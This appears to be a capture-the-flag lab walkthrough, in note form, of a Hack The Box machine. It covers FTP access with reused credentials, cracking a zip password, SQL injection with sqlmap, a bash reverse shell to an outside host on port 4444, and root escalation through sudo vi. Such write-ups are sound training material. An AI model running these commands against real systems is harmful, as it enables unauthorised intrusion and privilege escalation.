
![[Pasted image 20210420220907.png]]

Starting with a basic nmap scan 

![[Pasted image 20210420220836.png]]

We have the ftp port open 

In the previous machine Oopsie we got the credentials the ftp server 

IP : `10.10.10.46`

Username : `ftpuser`

Password : `mc@F1l3ZilL4`

![[Pasted image 20210420223627.png]]

We are logged in as `ftpuser`

There is a file called `backup.zip`

The file `backup.zip` has a password on it 
So we are not able to access the files inside it without the password

![[Pasted image 20210420224142.png]]

We use john the ripper tool to bruteforce and crack the password of the zip file 

![[Pasted image 20210420225924.png]]

We found the password to be `741852963`

After extracting the `backup.zip` we get 2 files
- `index.php`
- `style.css`

Viewing the index.php file we get the username and the password of the admin user 

![[Pasted image 20210420230238.png]]

Username : `admin`

Password : `2cb42f8734ea607eefed3b70af13bbd3`:`qwerty789`

![[Pasted image 20210420230515.png]]

The machine also has a web server running 

![[Pasted image 20210420224540.png]]

After logging in we get 

![[Pasted image 20210420230640.png]]

There is a search bar in the dashboard

![[Pasted image 20210420230746.png]]

When trying to insert some invalid character in the search query we get an sql error

Which means the site is most probably prone to SQL Injection

`sqlmap --url http://10.10.10.46/dashboard.php?search=f --cookie='PHPSESSID=58t090sdnarcal3h56nks2tnti' `

By running sqlmap we get 

![[Pasted image 20210420231649.png]]

That it is vulnerable

Using the `--os-shell` we can run commands as postgres user

![[Pasted image 20210420232016.png]]

We get a shell

`bash -c 'bash -i >& /dev/tcp/10.10.17.67/4444 0>&1'`

Running this command gives us a shell 

![[Pasted image 20210421180809.png]]

We get the password for postgres password 

username : `postgres`

password : `P@s5w0rd!`

![[Pasted image 20210421181425.png]]

The user can edit the file pg_hba.conf as a root user using `vi`

`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
`:!/bin/bash`

We get a root shell

![[Pasted image 20210421182735.png]]

	
	
